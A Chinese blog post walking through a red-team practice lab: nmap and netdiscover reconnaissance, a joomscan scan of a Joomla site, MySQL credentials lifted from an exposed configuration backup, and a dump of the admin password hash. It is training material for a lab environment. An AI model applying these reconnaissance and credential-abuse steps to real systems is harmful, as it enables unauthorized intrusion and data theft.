<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="saulGoodman">





<title>ATT&amp;CK-RedTeaming-实战入侵演练，横向渗透拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ATT&amp;CK-RedTeaming-实战入侵演练，横向渗透拿到Flag</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">December 29, 2019&nbsp;&nbsp;14:00:19</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/RedTeaming/">RedTeaming</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=33875750&auto=1&height=66"></iframe>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>靶机作者：licong<br>靶机下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">下载链接</a><br>靶机描述：域控中存在一份重要文件（获取域控权限）<br>靶机主机有5台：ubantu、win2008、win7、win2012、centos<br>攻击主机：KALI（192.168.93.128）、Win10（192.168.1.103）</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>因为我使用的网卡是新增的<code>VMnet2</code>（仅主机模式），IP段为<code>192.168.93.x</code>。所有探测靶场<code>IP</code>的时候就可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.93.1/24</span><br><span class="line">命令注释：-i 制定网卡，-r 指定IP段（扫描eth0网卡下的192.168.93.1的C段）</span><br></pre></td></tr></table></figure>

<p> <img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/876.png" alt="图片"></p>
<p>去除 <code>192.168.93.1</code> 和 <code>192.168.93.254</code> 这两个 <code>IP</code> ，剩下五个 <code>IP</code> 正好是这次靶机的 <code>IP</code> ！我们先通过 <code>NMAP</code> 对每个 <code>IP</code> 进行探测它的操作系统以及他们的端口开放服务，方便后面的一系列渗透测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.10</span><br><span class="line">注释：-sV 是让NMAP进行版本探测，-O 是探测操作系统</span><br></pre></td></tr></table></figure>

<p> <img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/877.png" alt="图片"></p>
<p> <code>192.168.93.10</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Windows 2012</code> ！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.20</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/878.png" alt="图片"></p>
<p><code>192.168.93.20</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Windows 2008</code>！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.30</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/879.png" alt="图片"></p>
<p><code>192.168.93.30</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Windows 7</code>！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.100</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/880.png" alt="图片"></p>
<p><code>192.168.93.100</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Linux</code>，但是无法确定是不是 <code>Ubantu</code>！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.120</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/881.png" alt="图片"></p>
<p><code>192.168.93.120</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Liunx</code>，通过探测端口开放信息得知它应该是 <code>Ubantu</code>，而上面的 <code>192.168.93.100</code> 那个估计就是 <code>Centos</code>了！</p>
<h2 id="攻击的拓扑图"><a href="#攻击的拓扑图" class="headerlink" title="攻击的拓扑图"></a>攻击的拓扑图</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/882.png" alt="图片"></p>
<p>其中 <code>KALI</code> 的 <code>IP</code> 会在文章中有变动，因为我搞这把靶场的时候中途关机过几次，随着开启启动<code>VMware</code>后<code>DHCP</code>会自动给它分配一个新的<code>IP</code>，所以我的 <code>KALI</code> 在文章中变成了 <code>192.168.1.128</code>、<code>192.168.1.129</code>、<code>192.168.1.130</code>！</p>
<p>（小弟第一次做拓扑图，就这样吧…）</p>
<h2 id="JoomlaCMS深入探测"><a href="#JoomlaCMS深入探测" class="headerlink" title="JoomlaCMS深入探测"></a>JoomlaCMS深入探测</h2><p>通过开放了 <code>http</code> 服务，我首先来看看 <code>192.168.93.20</code> 的 <code>web</code>，先是枚举了一下页面：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/883.png" alt="图片"></p>
<p>发现有一个 <code>401</code> 登陆认证的页面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.20/reports</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/884.png" alt="图片"></p>
<p>经过一系列的 admin:admin、admin:admin123 … 等等<code>弱口令</code>尝试后果断放弃！通过搜索了一下 <code>Windows 2008</code> 相关的漏洞发现有一个<code>永恒之蓝</code>：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/885.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/886.png" alt="图片"></p>
<p>但是没啥用，这个先暂时缓缓，总不能在一棵树上吊死吧！</p>
<p>来到下一个 IP : <code>192.168.93.30</code> ! 继续我们的<code>永恒之蓝</code>看看能不能打下来：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/887.png" alt="图片"></p>
<p>看了没用啊，靶机还是有点”困难”的啊，原本以为这靶机存在永恒之蓝就可以打下了，事不如愿呐。</p>
<p>继续下一个 IP ：<code>192.168.93.100</code>！通过再次的端口扫描所有详细信息后得知：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/888.png" alt="图片"></p>
<p>它开放了 <code>22</code>（ssh）,<code>80</code>（http）,<code>3306</code>（mysql），其中它 <code>80</code> 端口的 <code>web</code> 所使用的 <code>CMS</code> 为 <code>Joomla</code>！<code>JoomlaCMS</code>它是一套全球通用的CMS，所使用的脚本语言通常是 <code>PHP</code>。</p>
<p>访问 <code>http://192.168.93.100</code> 发现页面上没有什么可以利用点：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/889.png" alt="图片"></p>
<p>通过使用 <code>Joomscan</code> 这款工具对它进行了一系列扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rezasp/joomscan</span><br></pre></td></tr></table></figure>

<p>扫描结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~/hacker/joomscan-master<span class="comment"># perl joomscan.pl -u http://192.168.93.100/</span></span><br><span class="line"></span><br><span class="line">   ____  _____  _____  __  __  ___   ___    __    _  _ </span><br><span class="line">   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">			(1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.93.100/ ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.9.12</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.93.100/administrator/components</span><br><span class="line">http://192.168.93.100/administrator/modules</span><br><span class="line">http://192.168.93.100/administrator/templates</span><br><span class="line">http://192.168.93.100/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.93.100/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is found</span><br><span class="line">path : http://192.168.93.100/robots.txt </span><br><span class="line"></span><br><span class="line">Interesting path found from robots.txt</span><br><span class="line">http://192.168.93.100/joomla/administrator/</span><br><span class="line">http://192.168.93.100/administrator/</span><br><span class="line">http://192.168.93.100/bin/</span><br><span class="line">http://192.168.93.100/cache/</span><br><span class="line">http://192.168.93.100/cli/</span><br><span class="line">http://192.168.93.100/components/</span><br><span class="line">http://192.168.93.100/includes/</span><br><span class="line">http://192.168.93.100/installation/</span><br><span class="line">http://192.168.93.100/language/</span><br><span class="line">http://192.168.93.100/layouts/</span><br><span class="line">http://192.168.93.100/libraries/</span><br><span class="line">http://192.168.93.100/logs/</span><br><span class="line">http://192.168.93.100/modules/</span><br><span class="line">http://192.168.93.100/plugins/</span><br><span class="line">http://192.168.93.100/tmp/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name</span><br><span class="line">[++] error <span class="built_in">log</span> is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config file is found </span><br><span class="line"> config file path : http://192.168.93.100/configuration.php~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your Report : reports/192.168.93.100/</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/890.png" alt="图片"></p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/891.png" alt="图片"></p>
<p>其中有利用价值的文件目录有这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.100/administrator/</span><br><span class="line">http://192.168.93.100/robots.txt</span><br><span class="line">http://192.168.93.100/configuration.php</span><br></pre></td></tr></table></figure>

<p><code>administrator</code> 目录是一个登陆页面，尝试了它的默认密码以及弱口令无果：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/892.png" alt="图片"></p>
<p>来到 <code>robots.txt</code> 文件，没有发现泄漏了重要文件信息：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/893.png" alt="图片"></p>
<h2 id="登陆Mysql添加新的管理员账号"><a href="#登陆Mysql添加新的管理员账号" class="headerlink" title="登陆Mysql添加新的管理员账号"></a>登陆Mysql添加新的管理员账号</h2><p>但是 <code>configuration.php~</code> 这个文件泄露了 <code>mysql</code> 的数据库连接信息：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JConfig</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$offline_message</span> = <span class="string">&#x27;网站正在维护。&lt;br /&gt; 请稍候访问。&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$display_offline_message</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$offline_image</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sitename</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$captcha</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$access</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$debug_lang_const</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$dbtype</span> = <span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&#x27;testuser&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;cvcvgjASD!@&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span> = <span class="string">&#x27;joomla&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$dbprefix</span> = <span class="string">&#x27;am2zu_&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&#x27;gXN9Wbpk7ef3A4Ys&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$error_reporting</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$helpurl</span> = <span class="string">&#x27;https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ftp_host</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ftp_port</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$offset</span> = <span class="string">&#x27;UTC&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$mailonline</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$mailfrom</span> = <span class="string">&#x27;test@test.com&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$fromname</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cache_platformprefix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$MetaDesc</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$MetaKeys</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$MetaVersion</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$robots</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sef</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sef_rewrite</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sef_suffix</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$unicodeslugs</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$feed_limit</span> = <span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$feed_email</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/html/administrator/logs&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/html/tmp&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$shared_session</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/894.png" alt="图片"></p>
<p>如上图所示，我们得到了一个 <code>mysql</code> 的用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user：testuser </span><br><span class="line">pass：cvcvgjASD!@</span><br></pre></td></tr></table></figure>

<p>用泄露的用户名和密码尝试登陆 <code>mysql</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.93.100 -utestuser -p</span><br><span class="line">pass：cvcvgjASD!@</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/895.png" alt="图片"></p>
<p>通过查询 <code>joomla</code> 数据库的 <code>am2zu_users</code> 表下的 <code>username</code>、<code>password</code> 字段内容发现 <code>administrator</code> 用户的密码是加密的，而且不知道是啥加密，估计是加盐了。有知道的大佬麻烦告诉我，我会很感激的！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MySQL [joomla]&gt; select username,password from am2zu_users;</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| administrator | $2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2 |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/896.png" alt="图片"></p>
<p>抱着试一试的心态去 <code>cmd5</code> 解密了一下无果：</p>
<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/897.png" alt="图片"></p>
<p>额…那么换个思路！既然 <code>admin</code> 的密码拿不到，我们可不可以修改它的密码或者说添加一个管理员用户进去呢？</p>
<p>通过观看官方文档发现它可以通过 <code>SQL</code> 语句来添加一个新的用户:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</span><br></pre></td></tr></table></figure>

<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/898.png" alt="图片"></p>
